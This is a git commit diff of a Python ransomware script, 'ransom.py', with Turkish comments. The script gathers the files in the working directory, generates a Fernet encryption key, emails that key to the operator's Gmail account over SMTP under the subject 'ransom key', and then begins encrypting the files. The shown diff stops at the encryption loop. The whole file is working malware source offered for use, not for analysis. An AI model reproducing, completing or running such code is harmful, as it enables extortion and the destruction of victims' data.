4b763f0cbd48b1b5ebd20e72b7af1285de8e7ab4
Res4ad0 <142893459+Res4ad0@users.noreply.github.com>
2024-01-11 03:17:16 +0400

    Update ransom.py

--- ransom.py
+++ ransom.py
@@ -1,19 +1,28 @@
 import os
 import smtplib
+from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
+from email.mime.base import MIMEBase
+from email import encoders
 from cryptography.fernet import Fernet
 
 def send_email(subject, body, to_address, attachment_data=None):
-    from_address = '*@gmail.com'  # Kendi e-posta adresinizi girin
-    password = '*.'  # E-posta şifrenizi girin
+    from_address = 'your_email@gmail.com'  # Kendi e-posta adresinizi girin
+    password = 'your_email_password'  # E-posta şifrenizi girin
 
-    msg = MIMEText(body)
+    msg = MIMEMultipart()
     msg['From'] = from_address
     msg['To'] = to_address
     msg['Subject'] = subject
 
+    # E-posta gövdesi
+    msg.attach(MIMEText(body, 'plain'))
+
+    # E-posta eki
     if attachment_data:
-        part = MIMEText(attachment_data, 'base64')
+        part = MIMEBase('application', 'octet-stream')
+        part.set_payload(attachment_data)
+        encoders.encode_base64(part)
         part.add_header('Content-Disposition', f'attachment; filename=generatedkey.key')
         msg.attach(part)
 
@@ -22,7 +31,7 @@ def send_email(subject, body, to_address, attachment_data=None):
         server.login(from_address, password)
         server.sendmail(from_address, to_address, msg.as_string())
 
-
+# Dosya isimlerini toplamak için kullanılan kodu buraya ekleyin
 files = []
 for file in os.listdir():
     if file == "ransom.py" or file == "generatedkey.key" or file == "ransomdecrypter.py":
@@ -30,12 +39,13 @@ for file in os.listdir():
     if os.path.isfile(file):
         files.append(file)
 
-
+# Anahtarı oluştur
 key = Fernet.generate_key()
 
+# Anahtarı e-posta ile gönder
+send_email(subject='Fidye Anahtarı', body='Fidye anahtarı bulunmaktadır.', to_address='your_email@gmail.com', attachment_data=key)
 
-send_email(subject='Fidye Anahtarı', body=f'Fidye anahtarı: {key.decode()}', to_address='res4ad0@gmail.com', attachment_data=key.decode())
-
+# Dosyaları şifrele
 for file in files:
     with open(file, "rb") as the_file:
         contents = the_file.read()
